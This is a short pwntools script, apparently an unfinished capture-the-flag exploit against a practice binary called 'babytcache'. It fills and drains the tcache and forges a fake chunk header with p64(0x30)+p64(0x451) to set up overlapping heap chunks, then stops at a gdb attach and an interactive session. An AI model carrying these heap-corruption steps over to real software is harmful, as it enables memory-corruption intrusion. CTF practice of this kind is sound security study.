from pwn import *

context.log_level = 'debug'

p = process("./babytcache",env={"LD_PRELOAD":"./libc3.so"})

elf = ELF("./libc3.so")

def add(message):
	p.recvuntil(">>")
	p.sendline("1")
	p.recvuntil("leave some message:")
	p.send(message)
	
def delete(idx):
	p.recvuntil(">>")
	p.sendline("2")
	p.recvuntil("index:")
	p.sendline(str(idx))
	
def show(idx):
	p.recvuntil(">>")
	p.sendline("3")
	p.recvuntil("index:")
	p.sendline(str(idx))
	
if __name__=='__main__':
	
	message = 'a'*0x10
	for i in range(0,20):
		add(message)
	for i in range(0,7):
		delete(i+1)
		
	delete(0)
	delete(7)
	
	gdb.attach(p)
	add(message)	

	add(p64(0x30)+p64(0x451))	
	delete(1)
	add(message)	
	#gdb.attach(p)
#	add(message)
	p.interactive()
